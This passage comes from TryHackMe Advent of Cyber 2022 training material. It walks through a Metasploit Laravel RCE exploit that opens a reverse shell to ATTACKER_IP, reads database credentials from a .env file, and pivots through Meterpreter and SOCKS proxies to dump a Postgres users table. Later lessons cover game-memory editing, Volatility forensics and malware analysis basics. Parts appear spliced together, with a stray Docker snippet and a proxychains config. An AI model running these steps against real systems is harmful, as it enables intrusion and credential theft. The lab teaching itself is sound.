2. Select "Use Kali Linux" from the drop-down:

### Using Metasploit

If you are using the Web-based Kali machine or your own Kali machine, you can open Metasploit with the following `msfconsole` command:  

Shell commands

```shell-session
$ msfconsole

Metasploit tip: View advanced module options with advanced
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

After msfconsole is opened, there are multiple commands available:

Metasploit Console Commands

```shell-session
# To search for a module, use the ‘search’ command:
msf6 > search laravel

# Load a module with the ‘use’ command
msf6 > use multi/php/ignition_laravel_debug_rce

# view the information about the module, including the module options, description, CVE details, etc
msf6 exploit(multi/php/ignition_laravel_debug_rce) > info
```

After using a Metasploit module, you can view the options, set options, and run the module:

Metasploit Console Commands

```shell-session
# View the available options to set
show options

# Set the target host and logging
set rhost MACHINE_IP
set verbose true

# Set the payload listening address; this is the IP address of the host running Metasploit
set lhost LISTEN_IP

# show options again
show options

# Run or check the module
check
run
```

You can also directly set options from the `run` command:

Metasploit Console Commands

```shell-session
msf6 > use admin/postgres/postgres_sql
msf6 auxiliary(admin/postgres/postgres_sql) > run postgres://user:password@MACHINE_IP/database_name sql='select version()'
[*] Running module against 172.28.101.51

    PostgreSQL 10.5 on x86_64-pc-linux-musl, compiled by gcc (Alpine 6.4.0) 6.4.0, 64-bit

[*] Auxiliary module execution completed
```

### Using Meterpreter to pivot

Metasploit has an internal routing table that can be modified with the `route` command. This routing table determines where to send network traffic through, for instance, through a Meterpreter session. This way, we are using Meterpreter to pivot: sending traffic through to other machines on the network.

Note that Meterpreter has a separate route command, which is not the same as the top-level Metasploit prompt's route command described below. If you are currently interacting with a Meterpreter session, you must first `background` it.

Examples:

Metasploit Console Commands

```shell-session
# Example usage
route [add/remove] subnet netmask [comm/sid]

# Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session
route add 172.17.0.1/32 -1

# Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session
route add 172.28.10.48/29 -1

# Output the routing table
route print
```

### Socks Proxy

A socks proxy is an intermediate server that supports relaying networking traffic between two machines. This tool allows you to implement the technique of pivoting. You can run a socks proxy either locally on a pentester’s machine via Metasploit, or directly on the compromised server. In Metasploit, this can be achieved with the `auxiliary/server/socks_proxy` module:

Metasploit Console Commands

```shell-session
use auxiliary/server/socks_proxy
run srvhost=127.0.0.1 srvport=9050 version=4a
```

Tools such as `curl` support sending requests through a socks proxy server via the `--proxy` flag:

Shell commands

```shell-session
curl --proxy socks4a://localhost:9050 http://MACHINE_IP
```

If the tool does not natively support an option for using a socks proxy, ProxyChains can intercept the tool’s request to open new network connections and route the request through a socks proxy instead. For instance, an example with Nmap:

Shell commands

```shell-session
proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 MACHINE_IP
```

### Challenge Walkthrough

After deploying the attached VM, run Nmap against the target:

Shell commands

```shell-session
nmap -T4 -A -Pn MACHINE_IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 10:30 EDT
Nmap scan report for 10.10.173.133
Host is up (0.031s latency).

|_http-title: Curabitur aliquet, libero id suscipit semper
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After loading the web application in our browser at http://MACHINE_IP:80 (use Firefox on the Kali web-Machine) and inspecting the Network tab, we can see that the server responds with an HTTP Set-Cookie header indicating that the server is running Laravel - a common web application development framework:

![Image of the discovered web application. The browser's network developer tools are open and the 'Set-Cookie: laravel_session' HTTP header is highlighted](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed3f13d38407304044dd845/room-content/657260c9b96783c5d2d193013578c100.png)

The application may be vulnerable to a remote code execution exploit which impacts Laravel applications using debug mode with Laravel versions before 8.4.2, which use ignite as a developer dependency.

We can use Metasploit to verify if the application is vulnerable to this exploit.

Note: be sure to set the HttpClientTimeout=20, or the check may fail. In extreme situations where your connection is really slow/unstable, you may need a value higher than 20 seconds.  

Shell commands

```shell-session
$ msfconsole
msf6 > use multi/php/ignition_laravel_debug_rce
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(multi/php/ignition_laravel_debug_rce) > check rhost=MACHINE_IP HttpClientTimeout=20

[*] Checking component version to 10.10.143.36:80
[*] 10.10.143.36:80 - The target appears to be vulnerable.
```

**Note: When using TryHackMe's Kali Web-Machine - you should use eth0 as the LHOST value (ATTACKER_IP), and not the VPN IP shown in the Kali Machine at the top-right corner (which is tun0).**

To find out what IP address you need to use, you can open up a new terminal and enter `ip addr`. The IP address you need will start with _10.x.x.x_. Remember, you will either need to use eth0 or tun0, depending on whether or not you are using the TryHackMe Kali Web-Machine.

Using ip addr to list the interfaces corresponding IP address in Kali

```shell-session
kali@kali:~$ ip addr
2: eth0:  mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:cd:41:12:70:5d brd ff:ff:ff:ff:ff:ff
    inet 10.9.11.45/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2973sec preferred_lft 2973sec
    inet6 fe80::cd:41ff:fe12:705d/64 scope link
       valid_lft forever preferred_lft forever
```

Now that we’ve confirmed the vulnerability, let’s run the module to open a new session:  

Metasploit Console Commands

```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > run rhost=MACHINE_IP lhost=ATTACKER_IP HttpClientTimeout=20

[*] Started reverse TCP handler on 10.9.0.185:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking component version to 10.10.143.36:80
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.9.0.185:4444 -> 10.10.143.36:53986) at 2022-09-13 11:55:50 -0400
whoami

www-data
```

The opened shell will be a basic `cmd/unix/reverse_bash` shell. We can see this by running the background command and viewing the currently active sessions:

Metasploit Console Commands

```shell-session
background

Background session 1? [y/N]  y
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------

```

If you are currently in a session - you can run the `background` command to go back to the top-level Metasploit prompt. To upgrade the most recently opened session to Meterpreter, use the `sessions -u -1` command. Metasploit will now show two sessions opened - one for the original shell session and another for the new Meterpreter session:

Metasploit Console Commands

```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > sessions -u -1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [-1]

[*] Upgrading session ID: 1

  --  ----  ----                   -----------               ----------
  1         shell cmd/unix                                   10.9.0.185:4444 -> 10.10.143.36:53986 (10.10.143.36)

```

After interacting with the Meterpreter session with `sessions -i -1` and exploring the application, we can see there are database credentials available:

Meterpreter Commands

```shell-session
meterpreter > cat /var/www/.env
# ...

DB_CONNECTION=pgsql
DB_HOST=webservice_database
DB_PORT=5432
DB_DATABASE=....
DB_USERNAME=...
DB_PASSWORD=...
```

We can use Meterpreter to resolve this remote hostname to an IP address that we can use for attacking purposes:

Meterpreter Commands

```shell-session
meterpreter > resolve webservice_database

Host resolutions
================

    Hostname             IP Address
    --------             ----------
    webservice_database  172.28.101.51
```

As this is an internal IP address, it won’t be possible to send traffic to it directly. We can instead leverage the network pivoting support within msfconsole to reach the inaccessible host. To configure the global routing table in msfconsole, ensure you have run the `background` command from within a Meterpreter session:

Metasploit Console Commands

```shell-session
# The discovered webserice_database IP will be routed to through the Meterpreter session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.28.101.51/32 -1
[*] Route added
```

We can also see, due to the presence of the `/.dockerenv` file, that we are in a docker container. By default, Docker chooses a hard-coded IP to represent the host machine. We will also add that to our routing table for later scanning:

Metasploit Console Commands

```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route add 172.17.0.1/32 -1
[*] Route added
```

We can print the routing table to verify the configuration settings:

Metasploit Console Commands

```shell-session
msf6 exploit(multi/php/ignition_laravel_debug_rce) > route print

[*] There are currently no IPv6 routes defined.
```

With the previously discovered database credentials and the routing table configured, we can start to run Metasploit modules that target Postgres. Starting with a schema dump, followed by running queries to select information out of the database:

Metasploit Console Commands

```shell-session
# Dump the schema
use auxiliary/scanner/postgres/postgres_schemadump
run postgres://postgres:postgres@172.28.101.51/postgres

# Select information from a specific table
use auxiliary/admin/postgres/postgres_sql
run postgres://postgres:postgres@172.28.101.51/postgres sql='select * from users'
```

To further pivot through the private network, we can create a socks proxy within Metasploit:

Metasploit Console Commands

```shell-session
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > run srvhost=127.0.0.1 srvport=9050 version=4a
[*] Auxiliary module running as background job 1.

[*] Starting the SOCKS proxy server
```

This will expose a port on the attacker machine that can be used to run other network tools through, such as `curl` or `proxychains`

Shell commands

```shell-session
# From the attacker’s host machine, we can use curl with the internal Docker IP to show that the web application is running, and the socks proxy works
$ curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v

… etc …

# From the attacker’s host machine, we can use ProxyChains to scan the compromised host machine for common ports
$ proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 08:48 EDT

80/tcp   open   http
443/tcp  closed https
5432/tcp closed postgresql

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

With the host scanned, we can see that port 22 is open on the host machine. It also is possible that Santa has re-used his password, and it’s possible to SSH into the host machine from the Docker container to grab the flag:

Metasploit Console Commands

What IP is 172.17 0.1 docker?

Listen to Connections in the Docker Network  
  
The bridge connection docker0 – with IP address 172.17. 0.1 – is **created by Docker at installation time**. Because the host and all containers are connected to that network, our application only needs to listen to it.

## Proxy DNS requests - no leak for DNS data
# (disable all of the 3 items below to not proxy your DNS requests)

# method 1. this uses the proxychains4 style method to do remote dns:
# a thread is spawned that serves DNS requests and hands down an ip
# assigned from an internal list (via remote_dns_subnet).
# this is the easiest (setup-wise) and fastest method, however on
# systems with buggy libcs and very complex software like webbrowsers
# this might not work and/or cause crashes.
proxy_dns

# method 2. use the old proxyresolv script to proxy DNS requests
# in proxychains 3.1 style. requires `proxyresolv` in $PATH
# plus a dynamically linked `dig` binary.
# this is a lot slower than `proxy_dns`, doesn't support .onion URLs,
# but might be more compatible with complex software like webbrowsers.
#proxy_dns_old

# method 3. use proxychains4-daemon process to serve remote DNS requests.
# this is similar to the threaded `proxy_dns` method, however it requires
# that proxychains4-daemon is already running on the specified address.
# on the plus side it doesn't do malloc/threads so it should be quite
# compatible with complex, async-unsafe software.
# note that if you don't start proxychains4-daemon before using this,
# the process will simply hang.
#proxy_dns_daemon 127.0.0.1:1053

# set the class A subnet number to use for the internal remote DNS mapping
# we use the reserved 224.x.x.x range by default,
# if the proxified app does a DNS request, we will return an IP from that range.
# on further accesses to this ip we will send the saved DNS name to the proxy.
# in case some control-freak app checks the returned ip, and denies to 
# connect, you can use another subnet, e.g. 10.x.x.x or 127.x.x.x.
# of course you should make sure that the proxified app does not need
# *real* access to this subnet. 
# i.e. dont use the same subnet then in the localnet section
#remote_dns_subnet 127 
#remote_dns_subnet 10
remote_dns_subnet 224

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

### Examples for localnet exclusion
## localnet ranges will *not* use a proxy to connect.
## note that localnet works only when plain IP addresses are passed to the app,
## the hostname resolves via /etc/hosts, or proxy_dns is disabled or proxy_dns_old used.

## Exclude connections to 192.168.1.0/24 with port 80
# localnet 192.168.1.0:80/255.255.255.0

## Exclude connections to 192.168.100.0/24
# localnet 192.168.100.0/255.255.255.0

## Exclude connections to ANYwhere with port 80
# localnet 0.0.0.0:80/0.0.0.0
# localnet [::]:80/0

## RFC6890 Loopback address range
## if you enable this, you have to make sure remote_dns_subnet is not 127
## you'll need to enable it if you want to use an application that 
## connects to localhost.
# localnet 127.0.0.0/255.0.0.0
# localnet ::1/128

## RFC1918 Private Address Ranges
# localnet 10.0.0.0/255.0.0.0
# localnet 172.16.0.0/255.240.0.0
# localnet 192.168.0.0/255.255.0.0

### Examples for dnat
## Trying to proxy connections to destinations which are dnatted,
## will result in proxying connections to the new given destinations.
## Whenever I connect to 1.1.1.1 on port 1234 actually connect to 1.1.1.2 on port 443
# dnat 1.1.1.1:1234  1.1.1.2:443

## Whenever I connect to 1.1.1.1 on port 443 actually connect to 1.1.1.2 on port 443
## (no need to write :443 again)
# dnat 1.1.1.2:443  1.1.1.2

## No matter what port I connect to on 1.1.1.1 port actually connect to 1.1.1.2 on port 4
43
# dnat 1.1.1.1  1.1.1.2:443

## Always, instead of connecting to 1.1.1.1, connect to 1.1.1.2
# dnat 1.1.1.1  1.1.1.2

# ProxyList format
#       type  ip  port [user pass]

### [Day 10] Hack a game You're a mean one, Mr. Yeti

                    The Story

![AoC day 10 banner](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/cebaa8a8bc1647852b7488a611d3800d.png)

Check out Alh4zr3d's video walkthrough for Day 10 [here](https://www.youtube.com/watch?v=_ej3yMF31zg)!  

  

Santa's team have done well so far. The elves, blue and red combined, have been securing everything technological all around. The Bandit Yeti, unable to hack a thing, decided to go for eldritch magic as a last resort and trapped Elf McSkidy in a video game during her sleep. When the rest of the elves woke up, their leader was nowhere to be found until Elf Recon McRed noticed one of their screens, where Elf McSkidy's pixelated figure could be seen. By the screen, an icy note read: **"Only by winning the unwinnable game shall your dear Elf McSkidy be reclaimed"**.

Without their chief, the elves started running in despair. How could they run a SOC without its head? The game was rigged, and try after try, the elves would lose, no matter what. As struck by lightning, Elf Exploit McRed stood up from his chair and said to the others: **"If we can't win it, we'll hack it!"**.

![Elves in despair](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8ef207ff54fb2726ed9791aaa1e16f03.png)  

Learning Objectives

-   Learn how data is stored in memory in games or other applications.
-   Use simple tools to find and alter data in memory.
-   Explore the effects of changing data in memory on a running game.

The Memory of a Program

Whenever we execute a program, all data will be processed somehow through the computer's RAM (Random Access Memory). If you think of a videogame, your HP, position, movement speed and direction are all stored somewhere in memory and updated as needed as the game goes. 

![Game memory layout](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e73c41674384b537096f1e800b3edd95.png)  

  

If you can modify the relevant memory positions, you could trick the game into thinking you have more HP than you should or even a higher score! This sounds relatively easy, but a program's memory space is vast and sparse, and finding the location where these variables are stored is nothing you'd want to do by hand. Hopefully, some tools will help us navigate memory and find where all the juicy information is at.

  

Be sure to hit the **Start Machine** button before continuing. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. All you need for this challenge is available in the deployable machine. If you prefer to do so, however, you can download and install Cetus on your own machine by downloading it [from here](https://github.com/Qwokka/Cetus/releases/download/v1.03.1/Cetus_v1.03.1.zip).

![Cetus Logo](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e4960f1f69afa78cb4d0aded93e8dc08.png)  

The Mighty Cetus

Cetus is a simple browser plugin that works for Firefox and Chrome, allowing you to explore the memory space of Web Assembly games that run in your browser. The main idea behind it is to provide you with the tools to easily find any piece of data stored in memory and modify it if needed. On top of that, it will let you modify a game's compiled code and alter its behaviours if you want, although we won't need to go that deep for this task.

Cetus is already installed on Chrome in your deployed machine, so you can use it straight away for the rest of the task. If you find the game runs slowly when using the in-browser machine, you can always install Cetus on your machine and do the task from there, following the indications given below.

_Installing Cetus on Firefox (Click to read)_  

![Temporary Firefox Add-ons](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/af555c27570e44ae1bf8d39676fafb1b.png)

Accessing Cetus

To open the game, go to your deployed machine and click the "Save Elf McSkidy" icon on the desktop. This will open Google Chrome with Cetus already loaded for you.

![Game Icon in Machine](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b706d58ce17041d4708ad2d640bd589.png)  

To find Cetus, you need to open the `Developer tools` by clicking the button on the upper-right corner of Chrome, as shown in the figure below:

![Developer Tools](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/e50b53bdb7f272a9b88f850197c90275.png)  

Cetus is located in one of the tabs there:

![Finding Cetus](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3a8732a7ac9e05b0f2bceed318142a35.png)  

With Cetus open, hit the refresh button to reload the game. If you installed Cetus on your machine, you can find the game at [https://10.10.117.214/](https://10.10.117.214/). Cetus should detect the web assembly game running and show you the available tools:

![Cetus Interface](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/faaa4e72884c28021071797bc81e003c.png)  

**Note:** If Cetus shows the "Waiting for WASM" message, just reload the game, and the tools should load.

Guess the Guard's Number

If you walk around the game, you will find that the guard won't let you leave unless you guess a randomly generated number. At some point, the game must store this number in memory. Cetus will allow us to pinpoint the random number's memory address quickly.

As a first step, talk to the guard and try to guess the number randomly. You probably won't guess it first try, but take note of the guard's number.

![Guard random number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/86780fce97ef5e28dcbb3ca5d0948859.png)  

You can use Cetus to find all the memory addresses used by the game that match the given value. In this case, the guard's number is probably a regular integer, so we choose `i32` (32-bit integer) in Value Type.

Cetus also allows you to search for numbers with decimals (usually called floats), represented by the `f32` and `f64` types, and for strings encoded in `ascii`, `utf-8` or `bytes`. You need to specify the data type as part of your search because, for your computer, the values `32` (integer) and `32.0` (float) are stored in different formats in memory.

We will use the `EQ` comparison operator, which will search for memory addresses which content is equal to the value we input. Note that you can also search values using any of the other available operators. For reference, this is what other operators do:

**Operator**

**Description**

EQ

Find all memory addresses with contents that are **equal** to our inputted value.

NE

Find all memory addresses with contents that are **not equal** to our inputted value.  

LT

Find all memory addresses with contents that are **lower than** our inputted value.  

GT

Find all memory addresses with contents that are **greater than** our inputted value.  

LTE

Find all memory addresses with contents that are **lower than or equal to** our inputted value.  

GTE

Find all memory addresses with contents that are **greater than or equal** to our inputted value.  

Since the guard uses a random number, you will likely find the memory address on the first try. Once you do, click the bookmark button on the right of the memory address:  

![Searching the guard's number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9f0ec4e56f19e3ff32c3fe24261c39fe.png)  

You can then go to bookmarks to see your memory addresses:

![Cetus Bookmarks](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/351ece705759930b84a3a1b6f021a54c.png)  

Note that Cetus uses hexadecimal notation to show you the numbers. If you need to convert the shown numbers to decimal, you can use [this website](https://www.rapidtables.com/convert/number/hex-to-decimal.html).

With Cetus on the bookmarks tab, talk to the guard again and notice how the random number changes immediately. You can now guess the number:

![Guessing the number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/febcff5c18091088aa94fc54bb3a0a5a.png)  

Convert the number from hexadecimal to get the guard's number (0x005c9d35 = 6069557). You defeated the guard (sort of)!

**Note:** You can also modify the memory address containing the random number from the bookmarks tab. Try restarting the game and changing the guard's number right before the guard asks you for your number. You should now be able to change the guard's number at will!

Getting through the bridge

You are now out of your cell, but you still have to overcome some obstacles. Can you figure out how?

![The Bridge](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d874327f5f22f557ab32cdd5a6671d6b.png)

While you are wondering what other data in memory could be changed to survive the bridge, Elf Recon McRed tells you that he read about **differential search**. Differential Search, he said, allows you to run successive searches in tandem, where each search will be scoped over the results of the last search only instead of the whole memory space. Elf Recon thinks this might be of help somehow.

To help you better understand, he used the following example: suppose you want to find an address in memory, but you are not sure of the exact value it contains, but you can, however, manipulate it somehow by doing some actions in the game (you could manipulate the value of your position by moving, for example). Instead of doing a direct search by value as before, you can use differential search to look for memory positions based on specific **variations on the value**, rather than the value itself.

To start the differential search mode, your first search needs to be done with an empty value.  

![ElfRecon1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7d3f7a832da5cfe8d01245c6a4957daf.png)![Differential Search 1](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/21eb5bd08fe1523e02ef337b55ad9b78.png)

This will return the total number of memory addresses mapped by the game, which is `458753` in the image above. Now, suppose you want to know which memory addresses have decreased since the last search. You can run a second search using the `LT` operator without setting a value to search:

![ElfRecon2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0f87691ac4d57ba14dca67c3229f6b29.png)![Differential Search 2](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/098df9dbaf2afef7a7659b3ed0caeb99.png)

The result above tells us that only `44` memory positions of the total of `458753` have decreased in value since the last search. You can of course, continue to do successive searches. For example, if you now wanted to know which of the `44` resulting memory addresses from the first search have increased their value, you could simply do another search with the `GT` operator with no value again.

![Differential Search 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ac51390fdf80ae16f0b96a23f8808e1e.png)![ElfRecon3](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ccc56738fc0010c83a6619415dfa9588.png)

The result tells us that from the `44` memory addressed from the last search, only `26` have increased in value. If you are searching for a particular value, you can continue to do more searches until you find the memory address you are trying to get.

Armed with this knowledge, can you identify any parameters you'd like to search on memory to allow you to cross the bridge? The elves surely hope you do, as getting McSkidy out of the game now depends on you!

### [Day 11] Memory Forensics Not all gifts are nice

                       The Story

![an illustration depicting a wreath with ornaments](https://assets.tryhackme.com/additional/aoc2022/day11/banner.png)

Check out SecurityNinja's video walkthrough for Day 11 [here](https://www.youtube.com/watch?v=RsJR2z_agiY)!  

The elves in Santa's Security Operations Centre (SSOC) are hard at work checking their monitoring dashboards when Elf McDave, one of the workshop employees, knocks on the door. The elf says, _"I've just clicked on something and now my workstation is behaving in all kinds of weird ways. Can you take a look?"._

Elf McSkidy tasks you, Elf McBlue, to investigate the workstation. Running down to the workshop floor, you see a command prompt running some code. Uh oh! This is not good. You immediately create a memory dump of the workstation and place this dump onto your employee-issued USB stick, returning to the SSOC for further analysis.

_You plug the USB into your workstation and begin your investigation._

What is Memory Forensics?![a picture of elf mcblue](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/670492e08f9b74a3c38a5f6f219d2cdf.png)

Memory forensics is the analysis of the volatile memory that is in use when a computer is powered on. Computers use dedicated storage devices called Random Access Memory (RAM) to remember what is being performed on the computer at the time. RAM is extremely quick and is the preferred method of storing and accessing data. However, it is limited compared to storage devices such as hard drives. This type of data is volatile because it will be deleted when the computer is powered off. RAM stores data such as your clipboard or unsaved files. 

We can analyse a computer's memory to see what applications (processes), what network connections were being made, and many more useful pieces of information. For example, we can analyse the memory of a computer infected with malware to see what the malware was doing at the time.

Let's think about cooking. You normally store all of your food in the fridge - a hard drive is this fridge. When you are cooking, you will store ingredients on the kitchen counter so that you can quickly access them, but the kitchen counter (RAM) is much smaller than a fridge (hard drive)

Why is Memory Forensics Useful?![An image of a computer memory chip](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/50fa29c68caf89f0e3df5d19cfd40acd.png)

Memory forensics is an extremely important element when investigating a computer. A memory dump is a full capture of what was happening on the Computer at the time, for example, network connections or things running in the background. Most of the time, malicious code attempts to hide from the user. However, it cannot hide from memory.

We can use this capture of the memory for analysis at a later date, especially as the memory on the computer will eventually be lost (if, for example, we power off the computer to prevent malware from spreading). By analysing the memory, we can discover exactly what the malware was doing, who it was contacting, and such forth.

An Introduction to Processes

At the simplest, a process is a running program. For example, a process is created when running an instance of notepad. You can have multiple processes for an application (for example, running three instances of notepad will create three processes). This is important to know because being able to determine what processes were running on the computer will tell us what applications were running at the time of the capture.

On Windows, we can use Task Manager_(pictured below)_ to view and manage the processes running on the computer.

![A picture of Window's Task Manager](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/68217febd77dcd845ba608bb5ef6f34f.png)

_Window's Task Manager_

On a computer, processes are usually categorised into two groups:

**Category**

**Description**

**Example**

User Process

These processes are programs that the user has launched. For example, text editors, web browsers, etc.

notepad.exe - this is a text editor that is launched by the user.

Background Process

These processes are automatically launched and managed by the Operating System and are often essential to the Operating System behaving correctly.

dwm.exe - this is an essential process for Windows that is responsible for displaying windows and applications on the computer.

Introducing Volatility  

Volatility is an open-source memory forensics toolkit written in Python. Volatility allows us to analyse memory dumps taken from Windows, Linux and Mac OS devices and is an extremely popular tool in memory forensics. For example, Volatility allows us to:

-   List all processes that were running on the device at the time of the capture
-   List active and closed network connections
-   Use Yara rules to search for indicators of malware
-   Retrieve hashed passwords, clipboard contents, and contents of the command prompt
-   And much, much more!

Once Volatility and its requirements (i.e. Python) are installed, Volatility can be run using `python3 vol.py`. The terminal below displays Volatility's help menu:

  -h, --help            Show this help message and exit, for specific plugin options use 'volatility  --help'
  -c CONFIG, --config CONFIG
  --cropped for brevity--
```

Today's task will cover Volatility 3, which was initially released in 2020 to replace the deprecated Volatility 2 framework.  Volatility requires  a few arguments to run:

-   Calling the Volatility tool via `python3 vol.py`
-   Any options such as the name and location of the memory dump
-   The action you want to perform (I.e. what plugins you want to use - we'll come onto these shortly!)

Some common options and examples that you may wish to provide to Volatility are located in the table below:

Option

Description

Example

-f

This argument is where you provide the name and location of the memory dump that you wish to analyse.

`python3 vol.py -f /path/to/my/memorydump.vmem`

-v

This argument increases the verbosity of Volatility. This is sometimes useful to understand what Volatility is doing in cases of debugging.

`python3 vol.py -v`   

-p

This argument allows you to override the default location of where plugins are stored.

`python3 vol.py -p /path/to/my/custom/plugins`  

-o

This argument allows you to specify where extracted processes or DLLs are stored.

`python3 vol.py -o /output/extracted/files/here`  

And finally, now we need to decide what we want to analyse the image for. Volatility uses plugins to perform analysis, such as:

-   Listing processes
-   Listing network connections
-   Listing contents of the clipboard, notepad, or command prompt
-   And much more! If you're curious, you can read the documentation [here](https://volatility3.readthedocs.io/en/latest/volatility3.plugins.html)

In this task, we are going to use Volatility to:

1.  See what Operating System the memory dump is from
2.  See what processes were running at the time of capture
3.  See what connections were being made at the time of capture

Using Volatility to Analyse an Image  

Before proceeding with our analysis, we need to confirm the Operating System of the device that the memory has been captured from. We need to confirm this because it will determine what plugins we can use in our investigation.

First, let's use the `imageinfo` plugin to analyse our memory dump file to determine the Operating System. To do this, we need to use the following command (remembering to include our memory dump by using the `-f` option): `python3 vol.py -f workstation.vmem windows.info`.

_Note: This can sometimes take a couple of minutes, depending on the size of the memory dump and the hardware of the system running the scan._

Using Volatility to gather some information about the memory dump

```shell-session

Great! We can see that Volatility has confirmed that the Operating System is Windows. With this information, we now know we need to use the Windows sub-set of plugins with Volatility. The plugins that are going to be used in today's task are detailed in the table below:

Plugin

Description

Objective

windows.pslist

This plugin lists all of the processes that were running at the time of the capture.

To discover what processes were running on the system.

windows.psscan

This plugin allows us to analyse a specific process further.

To discover what a specific process was actually doing.  

windows.dumpfiles

This plugin allows us to export the process, where we can perform further analysis (i.e. static or dynamic analysis).

windows.netstat

This plugin lists all network connections at the time of the capture.

To understand what connections were being made. For example, was a process causing the computer to connect to a malicious server? We can use this IP address to implement defensive measures on other devices. For example, if we know an IP address is malicious, and another device is communicating with it, then we know that device is also infected.

_Please note that this is not all of the possible plugins. An extensive list of the Windows sub-set of plugins can be found [here](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.windows.html)._

### [Day 12] Malware Analysis Forensic McBlue to the REVscue!

                       The Story

![AoC Day 12 Banner.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0cd742900576fe374b2b493a0b4355a2.png)

Check out HuskyHack's video walkthrough for Day 12 [here](https://www.youtube.com/watch?v=kdQZPLRnr3g)!  

The malicious document attached to the phishing email was confirmed to have been executed. Aside from the fact that rogue connections were observed, we know little about what it does.

Our in-house expert **Forensic McBlue** confirmed that the malicious document spawned another suspicious binary. Pivoting from that, he dumped it from memory for this task to be further analysed via Malware Analysis.

![BOMB DISCOVERED!](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/899917d648d2dc56fdacb4a7c6384c2b.png)  

﻿Learning Objectives

-   Learn the fundamentals of analysing malware samples without relying on automated sandbox scanners.
-   Learn and understand typical malware behaviour and its importance in the incident investigation pipeline.

﻿Key Malware Behaviours  

Before touching the malware sample for this task, we need to briefly introduce common malware behaviours to have a good perspective on what to expect in handling malware samples. 

A prominent word in cybersecurity, **malware** is software created to harm a computer or an entire network. Threat actors develop malware to achieve specific goals, such as infiltrating networks, breaching sensitive data, or disrupting operational services.

If you were to inspect several malware samples in the wild, a typical pattern arises, making analysing other samples easier with experience. Knowing these common behaviours gives us an idea of what to look for on the defensive side, such as:

-   **Network connections** - Malware tends to establish either external network connections or internal connections. External connections allow remote access or for downloading staged payloads from a threat actors' infrastructure. Meanwhile, internal connections allow for lateral movement, a technique used to extend access to other hosts or applications within the network.
-   **Registry key modifications** - Malware typically uses registry keys to establish persistence, a technique used by threat actors to discreetly maintain long-term access to a system despite disruptions. A good example is Registry Run Keys, which allows binaries to be automatically executed when a user logs in or the machine boots up.
-   **File manipulations** -  Malware also tends to download (one of the common reasons to establish network connections) or create new files needed for its successful execution.

Given this knowledge, we can expect the possible behaviour of malware during an investigation.

Dangers of Analysing Malware Samples

**WARNING**: **Handling a malware sample is dangerous. Always consider precautions while analysing it.** 

With this, here are some helpful tips when handling live malware: ![Forensic McBlue to the rescue!](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2d2d07334ff4f2b031eb9809e11dc108.png)

